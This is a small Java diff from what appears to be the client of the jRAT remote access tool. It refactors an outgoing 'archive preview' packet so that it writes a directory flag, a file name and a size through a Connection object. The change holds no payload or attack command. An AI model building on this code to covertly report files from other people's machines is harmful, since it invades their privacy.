@@ -1,7 +1,6 @@
 package jrat.client.packets.outgoing;
 
-import jrat.common.io.StringWriter;
-import java.io.DataOutputStream;
+import jrat.client.Connection;
 
 
 public class Packet45ArchivePreview extends AbstractOutgoingPacket {
@@ -17,10 +16,10 @@ public class Packet45ArchivePreview extends AbstractOutgoingPacket {
 	}
 
 	@Override
-	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
-		dos.writeBoolean(directory);
-		sw.writeLine(name);
-		dos.writeLong(size);
+	public void write(Connection con) throws Exception {
+        con.writeBoolean(directory);
+        con.writeLine(name);
+        con.writeLong(size);
 	}
 
 	@Override
